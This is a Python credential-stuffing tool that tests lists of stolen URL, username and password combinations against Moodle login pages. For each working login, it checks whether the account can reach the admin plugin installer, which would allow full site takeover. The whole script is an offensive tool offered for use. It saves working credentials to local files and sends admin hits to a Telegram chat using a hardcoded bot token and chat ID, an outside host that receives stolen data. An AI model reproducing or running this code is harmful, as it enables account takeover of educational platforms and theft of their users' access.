import requests
from bs4 import BeautifulSoup
from telegram import Bot
import sys
import time

# =========================
# TELEGRAM CONFIG
# =========================
TELEGRAM_TOKEN = "8862509986:AAE0Jn_b_XHr4mQvQ0xpRE8hPDHBRdQ8IKk"
CHAT_ID = "-1003916774614"

bot = Bot(token=TELEGRAM_TOKEN)

# =========================
# LOAD FILE
# =========================
if len(sys.argv) != 2:
    print(f"Usage: python3 {sys.argv[0]} list.txt")
    sys.exit()

filename = sys.argv[1]

try:
    with open(filename, "r") as f:
        targets = [x.strip() for x in f if x.strip()]
except FileNotFoundError:
    print("[!] File tidak ditemukan")
    sys.exit()

admin_count = 0
user_count = 0
failed_count = 0

# =========================
# CHECK MOODLE LOGIN
# =========================
def check_moodle(url, username, password, current, total):

    global admin_count, user_count, failed_count

    session = requests.Session()

    try:
        print("=" * 70)
        print(f"[{current}/{total}] CHECKING")
        print(f"URL      : {url}")
        print(f"USERNAME : {username}")
        print(f"PASSWORD : {password}")
        print("=" * 70)

        headers = {
            "User-Agent": "Mozilla/5.0"
        }

        # =========================
        # GET LOGIN PAGE
        # =========================
        r = session.get(
            url,
            headers=headers,
            timeout=15
        )

        print(f"[+] GET Status : {r.status_code}")

        if r.status_code != 200:
            print("[-] Gagal akses login page\n")
            failed_count += 1
            return

        soup = BeautifulSoup(r.text, "html.parser")

        token_input = soup.find(
            "input",
            {"name": "logintoken"}
        )

        if not token_input:
            print("[-] logintoken tidak ditemukan\n")
            failed_count += 1
            return

        token = token_input.get("value")

        print(f"[+] Token : {token}")

        # =========================
        # LOGIN PAYLOAD
        # =========================
        payload = {
            "anchor": "",
            "logintoken": token,
            "username": username,
            "password": password,
            "rememberusername": 1
        }

        # =========================
        # POST LOGIN
        # =========================
        login = session.post(
            url,
            data=payload,
            headers=headers,
            timeout=15,
            allow_redirects=True
        )

        print(f"[+] POST Status : {login.status_code}")
        print(f"[+] Final URL   : {login.url}")

        html = login.text.lower()

        # =========================
        # LOGIN SUCCESS CHECK
        # =========================
        if (
            "dashboard" in html
            or "logout" in html
            or "/my/" in html
        ):

            print("[+] Login berhasil")

            # =========================
            # CHECK ADMIN PAGE
            # =========================
            admin_url = url.replace(
                "/login/index.php",
                "/admin/tool/installaddon/index.php"
            )

            print(f"[+] Check Admin URL : {admin_url}")

            admin_check = session.get(
                admin_url,
                headers=headers,
                timeout=15,
                allow_redirects=True
            )

            admin_html = admin_check.text.lower()

            # =========================
            # ADMIN DETECTED
            # =========================
            if (
                "install plugin from zip file" in admin_html
                or "install plugins" in admin_html
                or "tool_installaddon" in admin_html
            ):

                print("\n[✓] ADMIN LOGIN SUCCESS")
                print(f"[✓] {url} | {username} | {password}\n")

                admin_count += 1

                # save admin
                with open("moodle_admin.txt", "a") as f:
                    f.write(f"{url}|{username}|{password}\n")

                # telegram send
                msg = f"""
[MOODLE ADMIN SUCCESS]

URL  : {url}
USER : {username}
PASS : {password}
"""

                try:
                    bot.send_message(
                        chat_id=CHAT_ID,
                        text=msg
                    )

                    print("[+] Telegram sent\n")

                except Exception as tg_err:
                    print(f"[!] Telegram Error : {tg_err}\n")

            # =========================
            # USER ONLY
            # =========================
            else:

                print("\n[+] USER LOGIN SUCCESS")
                print(f"[+] {url} | {username} | {password}\n")

                user_count += 1

                with open("moodle_user.txt", "a") as f:
                    f.write(f"{url}|{username}|{password}\n")

        # =========================
        # LOGIN FAILED
        # =========================
        else:

            print("[-] LOGIN FAILED\n")
            failed_count += 1

    except requests.exceptions.Timeout:

        print("[-] TIMEOUT\n")
        failed_count += 1

    except requests.exceptions.ConnectionError:

        print("[-] CONNECTION ERROR\n")
        failed_count += 1

    except Exception as e:

        print(f"[-] ERROR : {e}\n")
        failed_count += 1


# =========================
# START
# =========================
print("\n")
print("=" * 70)
print("MOODLE ADMIN CHECKER")
print("=" * 70)
print(f"[+] Total Target : {len(targets)}")
print("=" * 70)

start = time.time()

for i, line in enumerate(targets, start=1):

    parts = line.split("|")

    if len(parts) != 3:
        print(f"[!] Format salah : {line}")
        continue

    url, user, pwd = parts

    check_moodle(
        url,
        user,
        pwd,
        i,
        len(targets)
    )

end = time.time()

# =========================
# SUMMARY
# =========================
print("\n")
print("=" * 70)
print("FINISHED")
print("=" * 70)
print(f"[+] Admin Success : {admin_count}")
print(f"[+] User Success  : {user_count}")
print(f"[+] Failed        : {failed_count}")
print(f"[+] Time          : {round(end - start, 2)} sec")
print("=" * 70)
